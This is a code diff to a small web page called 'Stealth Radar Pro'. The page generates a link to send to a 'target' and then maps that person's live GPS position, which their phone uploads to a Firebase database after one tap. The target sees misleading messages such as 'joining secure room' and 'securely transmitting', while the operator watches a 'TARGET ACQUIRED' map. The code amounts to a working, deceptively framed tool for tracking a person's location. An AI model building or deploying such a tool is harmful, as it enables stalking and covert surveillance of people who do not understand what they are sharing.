@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stealth Radar</title>
+    <title>Stealth Radar Pro</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         body { font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; background: #2c3e50; color: white; }
-        #map { height: 75vh; width: 100%; display: none; margin-top: 15px; border-top: 4px solid #34495e; }
+        #map { height: 70vh; width: 100%; display: none; margin-top: 15px; border-top: 4px solid #34495e; }
         .panel { padding: 25px; background: #34495e; margin: 20px auto; width: 90%; max-width: 500px; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.3); }
-        button { padding: 15px 20px; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; margin-top: 10px; transition: 0.2s; }
+        button { padding: 15px 20px; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; margin-top: 10px; }
         #generateBtn { background: #3498db; }
-        #generateBtn:hover { background: #2980b9; }
         #shareBtn { background: #e74c3c; }
-        #shareBtn:hover { background: #c0392b; }
-        input { padding: 15px; width: 85%; margin-top: 15px; text-align: center; font-size: 16px; border-radius: 6px; border: none; outline: none; background: #ecf0f1; color: #333; }
-        #status-text { color: #f1c40f; font-weight: bold; margin-top: 20px; font-size: 18px; }
+        input { padding: 15px; width: 85%; margin-top: 15px; text-align: center; font-size: 14px; border-radius: 6px; border: none; background: #ecf0f1; color: #333; }
+        #status-text { color: #f1c40f; font-weight: bold; margin-top: 20px; font-size: 16px; }
+        .diagnostic { font-size: 12px; color: #bdc3c7; margin-top: 10px; font-family: monospace; }
     </style>
 </head>
 <body>
-    <h2>📡 Stealth Radar System</h2>
+    <h2>📡 Stealth Radar Pro</h2>
     <div class="panel" id="ui-panel">
         <div id="controls"></div>
         <p id="status-text">System Ready.</p>
+        <p class="diagnostic" id="debug-log">Log: Waiting to start...</p>
     </div>
     <div id="map"></div>
 
@@ -46,22 +46,23 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
         
-        // Check if the URL has a target room attached
         const urlParams = new URLSearchParams(window.location.search);
         const targetRoom = urlParams.get('target');
         
         const controls = document.getElementById('controls');
         const statusText = document.getElementById('status-text');
+        const debugLog = document.getElementById('debug-log');
         const mapDiv = document.getElementById('map');
         
         let map, targetMarker;
 
         if (!targetRoom) {
-            // MODE 1: THE RADAR (Your Laptop)
+            // ==========================================
+            // MODE 1: RADAR (Your Laptop)
+            // ==========================================
             controls.innerHTML = `
                 <button id="generateBtn">🔗 Generate Tracking Link</button>
                 <div id="linkContainer" style="display:none;">
-                    <p style="font-size: 14px; color: #bdc3c7;">Copy and send this exact link to the target:</p>
                     <input type="text" id="shareLink" readonly onclick="this.select()">
                 </div>
             `;
@@ -74,53 +75,63 @@
                 document.getElementById('linkContainer').style.display = 'block';
                 document.getElementById('generateBtn').style.display = 'none';
                 
-                statusText.innerText = "Waiting for target to click the link...";
+                navigator.clipboard.writeText(link).catch(e => console.log("Clipboard error"));
                 
-                // Show the blank map and wait
+                statusText.innerText = "Waiting for Target to click link...";
+                debugLog.innerText = `Log: Listening to Room [${roomCode}]`;
+                
                 mapDiv.style.display = 'block';
                 map = L.map('map').setView([0, 0], 2);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                 
-                // Continuously listen to Firebase for the target's coordinates
                 onValue(ref(db, 'tracking/' + roomCode), (snapshot) => {
                     const data = snapshot.val();
                     if (data) {
                         statusText.innerText = "🚨 TARGET ACQUIRED! 🚨";
                         statusText.style.color = "#2ecc71";
+                        debugLog.innerText = `Log: Data received! Lat: ${data.lat.toFixed(4)}, Lon: ${data.lon.toFixed(4)}`;
                         
-                        // Update marker on the map
                         if (targetMarker) map.removeLayer(targetMarker);
-                        targetMarker = L.marker([data.lat, data.lon]).addTo(map)
-                            .bindPopup("<b>Target Location</b>").openPopup();
-                            
-                        map.setView([data.lat, data.lon], 16); // Zoom in
+                        targetMarker = L.marker([data.lat, data.lon]).addTo(map).bindPopup("<b>Target</b>").openPopup();
+                        map.setView([data.lat, data.lon], 16); 
                     }
                 });
             };
         } else {
-            // MODE 2: THE TARGET (Their Phone)
+            // ==========================================
+            // MODE 2: TARGET (Their Phone)
+            // ==========================================
             controls.innerHTML = `<button id="shareBtn">📍 Share My Location</button>`;
+            statusText.innerText = `You are joining secure room.`;
+            debugLog.innerText = `Log: Room code [${targetRoom}]`;
             
             document.getElementById('shareBtn').onclick = () => {
+                statusText.innerText = "Requesting GPS permissions...";
+                debugLog.innerText = "Log: Waiting for user to click Allow...";
+                document.getElementById('shareBtn').style.display = 'none';
+                
                 if (navigator.geolocation) {
-                    statusText.innerText = "Connecting to GPS...";
-                    document.getElementById('shareBtn').style.display = 'none';
-                    
                     navigator.geolocation.watchPosition((position) => {
-                        // Blast coordinates to Firebase
+                        debugLog.innerText = "Log: GPS coordinates captured! Sending to Firebase...";
+                        
                         set(ref(db, 'tracking/' + targetRoom), { 
                             lat: position.coords.latitude, 
                             lon: position.coords.longitude 
+                        }).then(() => {
+                            statusText.innerText = "✅ Location is securely transmitting!";
+                            statusText.style.color = "#2ecc71";
+                            debugLog.innerText = "Log: Successfully uploaded to cloud.";
+                        }).catch((error) => {
+                            statusText.innerText = "❌ Database Error.";
+                            debugLog.innerText = `Log Error: ${error.message}`;
                         });
                         
-                        statusText.innerText = "✅ Location is securely transmitting.";
-                        statusText.style.color = "#2ecc71";
-                    }, (err) => {
-                        statusText.innerText = "❌ Location blocked. Please allow permissions in Chrome/Safari.";
-                        statusText.style.color = "#e74c3c";
+                    }, (error) => {
+                        statusText.innerText = "❌ GPS Blocked or Failed.";
+                        debugLog.innerText = `Log Error: ${error.message}`;
                     }, { enableHighAccuracy: true });
                 } else {
-                    statusText.innerText = "GPS not supported on this device.";
+                    statusText.innerText = "GPS not supported.";
                 }
             };
         }
